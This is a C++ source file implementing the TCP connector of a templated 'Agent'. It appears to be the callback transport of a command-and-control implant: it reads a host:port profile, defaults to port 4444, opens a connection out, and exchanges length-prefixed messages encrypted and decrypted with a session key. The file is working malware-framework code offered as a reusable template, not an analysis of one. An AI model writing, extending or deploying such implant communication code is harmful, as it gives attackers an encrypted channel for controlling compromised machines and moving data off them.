// __NAME__ Agent — TCP Connector Implementation
//
// Minimal fallback TCP connector for base templates.
// Profile format: "host:port" (ASCII). Protocol overlays may replace this.

#include "ConnectorTCP.h"

#include "crypto.h"

#include <stdlib.h>
#include <string.h>

#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

ConnectorTCP::ConnectorTCP()
{
    host[0] = '\0';
    lstrcpyA(host, "127.0.0.1");
}

ConnectorTCP::~ConnectorTCP()
{
    CloseConnector();
}

BOOL ConnectorTCP::SetProfile(void* profile, BYTE* beat, ULONG beatSize)
{
    (void)beat;
    (void)beatSize;

    if (!wsaStarted) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return FALSE;
        }
        wsaStarted = TRUE;
    }

    if (!profile) {
        port = 4444;
        return TRUE;
    }

    const char* text = (const char*)profile;
    if (!text[0]) {
        port = 4444;
        return TRUE;
    }

    const char* colon = strrchr(text, ':');
    if (!colon) {
        size_t len = lstrlenA(text);
        if (len >= sizeof(host)) len = sizeof(host) - 1;
        memcpy(host, text, len);
        host[len] = '\0';
        port = 4444;
        return TRUE;
    }

    size_t hostLen = (size_t)(colon - text);
    if (hostLen == 0 || hostLen >= sizeof(host)) {
        return FALSE;
    }
    memcpy(host, text, hostLen);
    host[hostLen] = '\0';

    int parsedPort = atoi(colon + 1);
    if (parsedPort <= 0 || parsedPort > 65535) {
        return FALSE;
    }

    port = (WORD)parsedPort;
    return TRUE;
}

void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
    RecvClear();

    if (clientSocket == INVALID_SOCKET) {
        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket == INVALID_SOCKET) {
            recvLen = -1;
            return;
        }

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port ? port : 4444);

        if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
            hostent* he = gethostbyname(host);
            if (!he || he->h_length <= 0) {
                closesocket(clientSocket);
                clientSocket = INVALID_SOCKET;
                recvLen = -1;
                return;
            }
            memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
        }

        if (connect(clientSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET;
            recvLen = -1;
            return;
        }
    }

    ULONG sendSize = plainSize;
    BYTE* sendBuf = plainData;
    if (plainData && plainSize > 0) {
        uint32_t encryptedLen = 0;
        sendBuf = EncryptData(plainData, plainSize, sessionKey, sessionKey ? 16 : 0, &encryptedLen);
        if (!sendBuf) {
            recvLen = -1;
            return;
        }
        sendSize = encryptedLen;
    }

    int sent = send(clientSocket, (const char*)&sendSize, sizeof(sendSize), 0);
    if (sent != sizeof(sendSize)) {
        if (sendBuf != plainData && sendBuf) free(sendBuf);
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        recvLen = -1;
        return;
    }

    ULONG totalSent = 0;
    while (totalSent < sendSize) {
        int chunk = send(clientSocket, (const char*)(sendBuf + totalSent), sendSize - totalSent, 0);
        if (chunk <= 0) {
            if (sendBuf != plainData && sendBuf) free(sendBuf);
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET;
            recvLen = -1;
            return;
        }
        totalSent += (ULONG)chunk;
    }

    if (sendBuf != plainData && sendBuf) {
        free(sendBuf);
    }

    ULONG incomingSize = 0;
    int got = recv(clientSocket, (char*)&incomingSize, sizeof(incomingSize), MSG_WAITALL);
    if (got == 0) {
        recvLen = 0;
        return;
    }
    if (got != sizeof(incomingSize)) {
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        recvLen = -1;
        return;
    }

    if (incomingSize == 0) {
        recvLen = 0;
        return;
    }

    recvBuffer = (BYTE*)malloc(incomingSize);
    if (!recvBuffer) {
        recvLen = -1;
        return;
    }

    ULONG totalRead = 0;
    while (totalRead < incomingSize) {
        int chunk = recv(clientSocket, (char*)(recvBuffer + totalRead), incomingSize - totalRead, 0);
        if (chunk <= 0) {
            RecvClear();
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET;
            recvLen = -1;
            return;
        }
        totalRead += (ULONG)chunk;
    }

    recvLen = (int)incomingSize;
    uint32_t decryptedLen = 0;
    BYTE* decrypted = DecryptData(recvBuffer, incomingSize, sessionKey, sessionKey ? 16 : 0, &decryptedLen);
    if (decrypted) {
        free(recvBuffer);
        recvBuffer = decrypted;
        recvLen = (int)decryptedLen;
    }
}

BYTE* ConnectorTCP::RecvData()
{
    return recvBuffer;
}

int ConnectorTCP::RecvSize()
{
    return recvLen;
}

void ConnectorTCP::RecvClear()
{
    if (recvBuffer) {
        free(recvBuffer);
        recvBuffer = nullptr;
    }
    recvLen = 0;
}

void ConnectorTCP::CloseConnector()
{
    RecvClear();
    if (clientSocket != INVALID_SOCKET) {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
    }
    if (wsaStarted) {
        WSACleanup();
        wsaStarted = FALSE;
    }
}
